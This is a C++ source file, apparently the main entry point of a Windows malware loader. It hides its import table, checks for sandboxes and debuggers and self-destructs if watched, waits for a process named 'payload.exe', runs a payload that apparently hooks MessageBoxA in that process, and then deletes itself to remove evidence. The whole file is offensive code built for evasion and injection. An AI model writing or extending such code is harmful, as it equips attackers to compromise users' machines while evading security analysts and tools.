#include "Windows.h"
#include "API/headers/api.h"
#include "utils/headers/antianalysis.h"
#include "../headers/payload.h"
#include "utils/headers/Tools.h"

#define WIN32_LEAN_AND_MEAN
//#define TARGET_FUNC	"WriteFile"
//#define TARGET_DLL	"Kernel32"

//#define TARGET_FUNC	"MessageBoxA"
//#define TARGET_DLL	"USER32"

char const*	TARGET_FUNC = "MessageBoxA";
const char* TARGET_DLL  = "USER32";


// Get rid of weird crt call because of float
#ifdef __cplusplus
extern "C" {
#endif
	int _fltused = 0;
#ifdef __cplusplus
}
#endif

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	AntiAnalysis hide;
	Tools		 tools;
	DWORD		 process = 0; 


	API::APIResolver &resolver = API::APIResolver::GetInstance(); // Get instance of the API resolver


	hide.IsBeingWatched(resolver); // Initial antianalysis check
	
	resolver.IATCamo();		// Camouflage the import address table
	resolver.LoadModules(); // Get handles to necessary dlls
	resolver.ResolveAPI();  // Resolve Win/Nt api functions 

	auto api	  = resolver.GetAPIAccess();  // retrieve function pointers
	
	//hide.DelayExecution(5, resolver);				      // wait 5 minutes before execution


	do
	{
		hide.IsBeingWatched(resolver);				  // Nuke self if in sandbox or debugger
		process = tools.GetPID("payload.exe");	  // Check if target process is running

		if (process != 0)
		{
			hide.DelayExecution(0.05, resolver);  // Wait a bit before executing payload
			break;
		}

		hide.DelayExecution(0.1, resolver);		  // Check for process startup every few minutes
	} while (process == 0);

	Payload(process, api, TARGET_DLL, (char*)TARGET_FUNC);// Run the payload
	
	hide.Nuke(resolver);								  // Remove evidence
	return 0;
} 


